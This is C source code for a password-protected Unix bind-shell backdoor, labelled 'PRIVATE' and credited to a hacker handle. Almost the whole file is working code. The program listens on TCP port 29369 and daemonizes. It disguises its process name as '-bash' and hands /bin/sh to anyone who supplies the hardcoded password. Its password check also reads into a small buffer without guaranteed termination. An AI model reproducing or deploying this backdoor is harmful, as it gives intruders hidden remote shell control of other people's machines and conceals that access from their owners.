/* xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx */
/*                 P R I V A T E                        */
/********************************************************/
/* Opens a password protected backd00r and lets you     */
/* execute commands, and then hides in the background   */
/* I would like to thank SyF for gs.c                   */
/*                coded by misteri0 //UnlG              */
/********************************************************/
/*                 P R I V A T E                        */
/* xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx */
#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <strings.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <signal.h>
#define PASSAUTH 1 /* undefine this is you won't want a password at the
beginning */

#define PORT            29369
#define MSG_WELCOME     "unlg's backd00r, enter whatever is necessary\n All
commands are followed by a ;\n"
#define MSG_PASSWORD    "Password: "
#define MSG_WRONGPASS   "Invalid password\n"
#define MSG_OK          "Welcome...\n"
#define MSG_CONTINUE    "Do you want to continue?\n"

#define HIDE            "-bash"
#define SHELL           "/bin/sh"

#ifdef PASSAUTH
        #define PASSWD "app910h"
#endif

int main (int argc, char *argv[]);
#ifdef PASSAUTH
int login (int);
#endif

int background()
{
int pid;
signal(SIGCHLD,SIG_IGN);
pid = fork();
if(pid>0)
{
sleep(1);
exit(EXIT_SUCCESS);     // parent, exit
}
if(pid==0)
{
signal(SIGCHLD,SIG_DFL);
return getpid();                // child, go on
}
return -1;                      // fork failed
}

int
main (int argc, char *argv[])
{
        int sockfd, newfd, size;
        struct sockaddr_in local;
        struct sockaddr_in remote;
        char cmd[256];

        strcpy (argv[0], HIDE);
        signal (SIGCHLD, SIG_IGN);

        bzero (&local, sizeof(local));
        local.sin_family = AF_INET;
        local.sin_port = htons (PORT);
        local.sin_addr.s_addr = INADDR_ANY;
        bzero (&(local.sin_zero), 8);

        if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
                perror("socket");
                exit(1);
        }

        if (bind (sockfd, (struct sockaddr *)&local, sizeof(struct sockaddr)) ==
-1) {
                perror("bind");
                exit(1);
        }

        if (listen(sockfd, 5) == -1) {
                perror("listen");
                exit(1);
        }
        size = sizeof(struct sockaddr_in);
        background();
        while (1) {
                if ((newfd = accept (sockfd, (struct sockaddr *)&remote, &size))
== -1) {
                        perror ("accept");
                        exit(1);
                }

                if (!fork ()) {
                        send (newfd, MSG_WELCOME, sizeof(MSG_WELCOME), 0);

#ifdef PASSAUTH
                        if (login(newfd) != 1) {
                                send (newfd, MSG_WRONGPASS,
sizeof(MSG_WRONGPASS), 0);
                                close (newfd);
                                exit(1);
                        }
#endif

                        close (0); close(1); close(2);
                        dup2 (newfd, 0); dup2(newfd, 1); dup2(newfd, 2);
                        execl (SHELL, SHELL, (char *)0); close(newfd);
exit(0);
                }
                close (newfd);
        }
        return 0;
}

#ifdef PASSAUTH
int
login (int fd)
{
        char u_passwd[15];
        int i;

        send (fd, MSG_PASSWORD, sizeof(MSG_PASSWORD), 0);
        recv (fd, u_passwd, sizeof(u_passwd), 0);

        for (i = 0; i < strlen (u_passwd); i++) {
                if (u_passwd[i] == '\n' || u_passwd[i] == '\r')
                u_passwd[i] = '\0';
        }

        if (strcmp (PASSWD, u_passwd) == 0) {
                return 1;
        } else {
                return 0;
        }
}
#endif



/*           À=-Ýß passed thru infected network  ßÝ-=À         */
/*           À=-Ýß   http://infected.ilm.net/    ßÝ-=À         */
